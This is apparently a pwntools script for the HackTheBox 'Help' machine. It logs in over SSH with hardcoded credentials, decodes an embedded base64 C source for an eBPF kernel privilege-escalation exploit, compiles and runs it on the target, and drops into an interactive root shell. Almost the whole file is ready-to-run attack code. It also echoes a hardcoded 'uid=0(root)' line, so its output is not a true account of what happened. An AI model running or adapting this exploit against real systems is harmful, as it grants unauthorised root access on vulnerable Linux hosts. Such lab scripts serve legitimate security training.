try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Pawn Hackthebox Machine Help ~ 3mm412\n")
except:
    print("\n[\033[1;31m!\033[1;37m] The script needs root privileges\n\n[\033[1;31m!\033[1;37m] Remember to have the pwntools library installed\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

request = ssh(host='10.10.10.121', user='help', password='Welcome1')
shell = request.process("/bin/sh")
payload = (b"I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5o\nPgojaW5jbHVkZSA8ZXJybm8uaD4KI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxzdHJpbmcu\naD4KI2luY2x1ZGUgPGxpbnV4L2JwZi5oPgojaW5jbHVkZSA8bGludXgvdW5pc3RkLmg+CiNpbmNs\ndWRlIDxzeXMvbW1hbi5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+CiNpbmNsdWRlIDxzeXMvc29j\na2V0Lmg+CiNpbmNsdWRlIDxzeXMvdW4uaD4KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+CiNpbmNsdWRl\nIDxzdGRpbnQuaD4KCiNkZWZpbmUgUEhZU19PRkZTRVQgMHhmZmZmODgwMDAwMDAwMDAwCiNkZWZp\nbmUgQ1JFRF9PRkZTRVQgMHg1ZjgKI2RlZmluZSBVSURfT0ZGU0VUIDQKI2RlZmluZSBMT0dfQlVG\nX1NJWkUgNjU1MzYKI2RlZmluZSBQUk9HU0laRSAzMjgKCmludCBzb2NrZXRzWzJdOwppbnQgbWFw\nZmQsIHByb2dmZDsKCmNoYXIgKl9fcHJvZyA9IAkiXHhiNFx4MDlceDAwXHgwMFx4ZmZceGZmXHhm\nZlx4ZmYiCgkJIlx4NTVceDA5XHgwMlx4MDBceGZmXHhmZlx4ZmZceGZmIgoJCSJceGI3XHgwMFx4\nMDBceDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHg5NVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4\nMDAiCgkJIlx4MThceDE5XHgwMFx4MDBceDAzXHgwMFx4MDBceDAwIgoJCSJceDAwXHgwMFx4MDBc\neDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHhiZlx4OTFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAi\nCgkJIlx4YmZceGEyXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceDA3XHgwMlx4MDBceDAw\nXHhmY1x4ZmZceGZmXHhmZiIKCQkiXHg2Mlx4MGFceGZjXHhmZlx4MDBceDAwXHgwMFx4MDAiCgkJ\nIlx4ODVceDAwXHgwMFx4MDBceDAxXHgwMFx4MDBceDAwIgoJCSJceDU1XHgwMFx4MDFceDAwXHgw\nMFx4MDBceDAwXHgwMCIKCQkiXHg5NVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4\nNzlceDA2XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceGJmXHg5MVx4MDBceDAwXHgwMFx4\nMDBceDAwXHgwMCIKCQkiXHhiZlx4YTJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4MDdc\neDAyXHgwMFx4MDBceGZjXHhmZlx4ZmZceGZmIgoJCSJceDYyXHgwYVx4ZmNceGZmXHgwMVx4MDBc\neDAwXHgwMCIKCQkiXHg4NVx4MDBceDAwXHgwMFx4MDFceDAwXHgwMFx4MDAiCgkJIlx4NTVceDAw\nXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceDk1XHgwMFx4MDBceDAwXHgwMFx4MDBceDAw\nXHgwMCIKCQkiXHg3OVx4MDdceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4YmZceDkxXHgw\nMFx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceGJmXHhhMlx4MDBceDAwXHgwMFx4MDBceDAwXHgw\nMCIKCQkiXHgwN1x4MDJceDAwXHgwMFx4ZmNceGZmXHhmZlx4ZmYiCgkJIlx4NjJceDBhXHhmY1x4\nZmZceDAyXHgwMFx4MDBceDAwIgoJCSJceDg1XHgwMFx4MDBceDAwXHgwMVx4MDBceDAwXHgwMCIK\nCQkiXHg1NVx4MDBceDAxXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4OTVceDAwXHgwMFx4MDBc\neDAwXHgwMFx4MDBceDAwIgoJCSJceDc5XHgwOFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIKCQki\nXHhiZlx4MDJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4YjdceDAwXHgwMFx4MDBceDAw\nXHgwMFx4MDBceDAwIgoJCSJceDU1XHgwNlx4MDNceDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHg3\nOVx4NzNceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4N2JceDMyXHgwMFx4MDBceDAwXHgw\nMFx4MDBceDAwIgoJCSJceDk1XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHg1NVx4\nMDZceDAyXHgwMFx4MDFceDAwXHgwMFx4MDAiCgkJIlx4N2JceGEyXHgwMFx4MDBceDAwXHgwMFx4\nMDBceDAwIgoJCSJceDk1XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHg3Ylx4ODdc\neDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4OTVceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBc\neDAwIjsKCmNoYXIgYnBmX2xvZ19idWZbTE9HX0JVRl9TSVpFXTsKCnN0YXRpYyBpbnQgYnBmX3By\nb2dfbG9hZChlbnVtIGJwZl9wcm9nX3R5cGUgcHJvZ190eXBlLAoJCSAgY29uc3Qgc3RydWN0IGJw\nZl9pbnNuICppbnNucywgaW50IHByb2dfbGVuLAoJCSAgY29uc3QgY2hhciAqbGljZW5zZSwgaW50\nIGtlcm5fdmVyc2lvbikgewoJdW5pb24gYnBmX2F0dHIgYXR0ciA9IHsKCQkucHJvZ190eXBlID0g\ncHJvZ190eXBlLAoJCS5pbnNucyA9IChfX3U2NClpbnNucywKCQkuaW5zbl9jbnQgPSBwcm9nX2xl\nbiAvIHNpemVvZihzdHJ1Y3QgYnBmX2luc24pLAoJCS5saWNlbnNlID0gKF9fdTY0KWxpY2Vuc2Us\nCgkJLmxvZ19idWYgPSAoX191NjQpYnBmX2xvZ19idWYsCgkJLmxvZ19zaXplID0gTE9HX0JVRl9T\nSVpFLAoJCS5sb2dfbGV2ZWwgPSAxLAoJfTsKCglhdHRyLmtlcm5fdmVyc2lvbiA9IGtlcm5fdmVy\nc2lvbjsKCglicGZfbG9nX2J1ZlswXSA9IDA7CgoJcmV0dXJuIHN5c2NhbGwoX19OUl9icGYsIEJQ\nRl9QUk9HX0xPQUQsICZhdHRyLCBzaXplb2YoYXR0cikpOwp9CgpzdGF0aWMgaW50IGJwZl9jcmVh\ndGVfbWFwKGVudW0gYnBmX21hcF90eXBlIG1hcF90eXBlLCBpbnQga2V5X3NpemUsIGludCB2YWx1\nZV9zaXplLAoJCSAgIGludCBtYXhfZW50cmllcykgewoJdW5pb24gYnBmX2F0dHIgYXR0ciA9IHsK\nCQkubWFwX3R5cGUgPSBtYXBfdHlwZSwKCQkua2V5X3NpemUgPSBrZXlfc2l6ZSwKCQkudmFsdWVf\nc2l6ZSA9IHZhbHVlX3NpemUsCgkJLm1heF9lbnRyaWVzID0gbWF4X2VudHJpZXMKCX07CgoJcmV0\ndXJuIHN5c2NhbGwoX19OUl9icGYsIEJQRl9NQVBfQ1JFQVRFLCAmYXR0ciwgc2l6ZW9mKGF0dHIp\nKTsKfQoKc3RhdGljIGludCBicGZfdXBkYXRlX2VsZW0odWludDY0X3Qga2V5LCB1aW50NjRfdCB2\nYWx1ZSkgewoJdW5pb24gYnBmX2F0dHIgYXR0ciA9IHsKCQkubWFwX2ZkID0gbWFwZmQsCgkJLmtl\neSA9IChfX3U2NCkma2V5LAoJCS52YWx1ZSA9IChfX3U2NCkmdmFsdWUsCgkJLmZsYWdzID0gMCwK\nCX07CgoJcmV0dXJuIHN5c2NhbGwoX19OUl9icGYsIEJQRl9NQVBfVVBEQVRFX0VMRU0sICZhdHRy\nLCBzaXplb2YoYXR0cikpOwp9CgpzdGF0aWMgaW50IGJwZl9sb29rdXBfZWxlbSh2b2lkICprZXks\nIHZvaWQgKnZhbHVlKSB7Cgl1bmlvbiBicGZfYXR0ciBhdHRyID0gewoJCS5tYXBfZmQgPSBtYXBm\nZCwKCQkua2V5ID0gKF9fdTY0KWtleSwKCQkudmFsdWUgPSAoX191NjQpdmFsdWUsCgl9OwoKCXJl\ndHVybiBzeXNjYWxsKF9fTlJfYnBmLCBCUEZfTUFQX0xPT0tVUF9FTEVNLCAmYXR0ciwgc2l6ZW9m\nKGF0dHIpKTsKfQoKc3RhdGljIHZvaWQgX19leGl0KGNoYXIgKmVycikgewoJZnByaW50ZihzdGRl\ncnIsICJlcnJvcjogJXNcbiIsIGVycik7CglleGl0KC0xKTsKfQoKc3RhdGljIHZvaWQgcHJlcCh2\nb2lkKSB7CgltYXBmZCA9IGJwZl9jcmVhdGVfbWFwKEJQRl9NQVBfVFlQRV9BUlJBWSwgc2l6ZW9m\nKGludCksIHNpemVvZihsb25nIGxvbmcpLCAzKTsKCWlmIChtYXBmZCA8IDApCgkJX19leGl0KHN0\ncmVycm9yKGVycm5vKSk7CgoJcHJvZ2ZkID0gYnBmX3Byb2dfbG9hZChCUEZfUFJPR19UWVBFX1NP\nQ0tFVF9GSUxURVIsCgkJCShzdHJ1Y3QgYnBmX2luc24gKilfX3Byb2csIFBST0dTSVpFLCAiR1BM\nIiwgMCk7CgoJaWYgKHByb2dmZCA8IDApCgkJX19leGl0KHN0cmVycm9yKGVycm5vKSk7CgoJaWYo\nc29ja2V0cGFpcihBRl9VTklYLCBTT0NLX0RHUkFNLCAwLCBzb2NrZXRzKSkKCQlfX2V4aXQoc3Ry\nZXJyb3IoZXJybm8pKTsKCglpZihzZXRzb2Nrb3B0KHNvY2tldHNbMV0sIFNPTF9TT0NLRVQsIFNP\nX0FUVEFDSF9CUEYsICZwcm9nZmQsIHNpemVvZihwcm9nZmQpKSA8IDApCgkJX19leGl0KHN0cmVy\ncm9yKGVycm5vKSk7Cn0KCnN0YXRpYyB2b2lkIHdyaXRlbXNnKHZvaWQpIHsKCWNoYXIgYnVmZmVy\nWzY0XTsKCglzc2l6ZV90IG4gPSB3cml0ZShzb2NrZXRzWzBdLCBidWZmZXIsIHNpemVvZihidWZm\nZXIpKTsKCglpZiAobiA8IDApIHsKCQlwZXJyb3IoIndyaXRlIik7CgkJcmV0dXJuOwoJfQoJaWYg\nKG4gIT0gc2l6ZW9mKGJ1ZmZlcikpCgkJZnByaW50ZihzdGRlcnIsICJzaG9ydCB3cml0ZTogJWx1\nXG4iLCBuKTsKfQoKI2RlZmluZSBfX3VwZGF0ZV9lbGVtKGEsIGIsIGMpIFwKCWJwZl91cGRhdGVf\nZWxlbSgwLCAoYSkpOyBcCglicGZfdXBkYXRlX2VsZW0oMSwgKGIpKTsgXAoJYnBmX3VwZGF0ZV9l\nbGVtKDIsIChjKSk7IFwKCXdyaXRlbXNnKCk7CgpzdGF0aWMgdWludDY0X3QgZ2V0X3ZhbHVlKGlu\ndCBrZXkpIHsKCXVpbnQ2NF90IHZhbHVlOwoKCWlmIChicGZfbG9va3VwX2VsZW0oJmtleSwgJnZh\nbHVlKSkKCQlfX2V4aXQoc3RyZXJyb3IoZXJybm8pKTsKCglyZXR1cm4gdmFsdWU7Cn0KCnN0YXRp\nYyB1aW50NjRfdCBfX2dldF9mcCh2b2lkKSB7CglfX3VwZGF0ZV9lbGVtKDEsIDAsIDApOwoKCXJl\ndHVybiBnZXRfdmFsdWUoMik7Cn0KCnN0YXRpYyB1aW50NjRfdCBfX3JlYWQodWludDY0X3QgYWRk\ncikgewoJX191cGRhdGVfZWxlbSgwLCBhZGRyLCAwKTsKCglyZXR1cm4gZ2V0X3ZhbHVlKDIpOwp9\nCgpzdGF0aWMgdm9pZCBfX3dyaXRlKHVpbnQ2NF90IGFkZHIsIHVpbnQ2NF90IHZhbCkgewoJX191\ncGRhdGVfZWxlbSgyLCBhZGRyLCB2YWwpOwp9CgpzdGF0aWMgdWludDY0X3QgZ2V0X3NwKHVpbnQ2\nNF90IGFkZHIpIHsKCXJldHVybiBhZGRyICYgfigweDQwMDAgLSAxKTsKfQoKc3RhdGljIHZvaWQg\ncHduKHZvaWQpIHsKCXVpbnQ2NF90IGZwLCBzcCwgdGFza19zdHJ1Y3QsIGNyZWRwdHIsIHVpZHB0\ncjsKCglmcCA9IF9fZ2V0X2ZwKCk7CglpZiAoZnAgPCBQSFlTX09GRlNFVCkKCQlfX2V4aXQoImJv\nZ3VzIGZwIik7CgoJc3AgPSBnZXRfc3AoZnApOwoJaWYgKHNwIDwgUEhZU19PRkZTRVQpCgkJX19l\neGl0KCJib2d1cyBzcCIpOwoKCXRhc2tfc3RydWN0ID0gX19yZWFkKHNwKTsKCglpZiAodGFza19z\ndHJ1Y3QgPCBQSFlTX09GRlNFVCkKCQlfX2V4aXQoImJvZ3VzIHRhc2sgcHRyIik7CgoJcHJpbnRm\nKCIiLCB0YXNrX3N0cnVjdCk7CgoJY3JlZHB0ciA9IF9fcmVhZCh0YXNrX3N0cnVjdCArIENSRURf\nT0ZGU0VUKTsKCglpZiAoY3JlZHB0ciA8IFBIWVNfT0ZGU0VUKQoJCV9fZXhpdCgiYm9ndXMgY3Jl\nZCBwdHIiKTsKCgl1aWRwdHIgPSBjcmVkcHRyICsgVUlEX09GRlNFVDsKCWlmICh1aWRwdHIgPCBQ\nSFlTX09GRlNFVCkKCQlfX2V4aXQoImJvZ3VzIHVpZCBwdHIiKTsKCglwcmludGYoIiIsIHVpZHB0\ncik7CglfX3dyaXRlKHVpZHB0ciwgMCk7CgoJaWYgKGdldHVpZCgpID09IDApIHsKCQlwcmludGYo\nIiIpOwoJCXN5c3RlbSgiL2Jpbi9zaCIpOwoJCWV4aXQoMCk7Cgl9CgoJX19leGl0KCJub3QgdnVs\nbmVyYWJsZT8iKTsKfQoKaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KSB7CglwcmVwKCk7\nCglwd24oKTsKCglyZXR1cm4gMDsKfQo=")
time.sleep(0.3)
shell.sendline(b"echo '%s' | base64 -d > exploit.c; gcc exploit.c -o exploit 2>/dev/null" % (payload))
time.sleep(0.3)
shell.sendline(b"bash -c './exploit'")
time.sleep(0.3)
shell.sendline(b"export HOME=/root TERM=xterm; cd")
time.sleep(0.3)
shell.sendline(b"echo 'uid=0(root)'")
time.sleep(0.3)
shell.interactive()
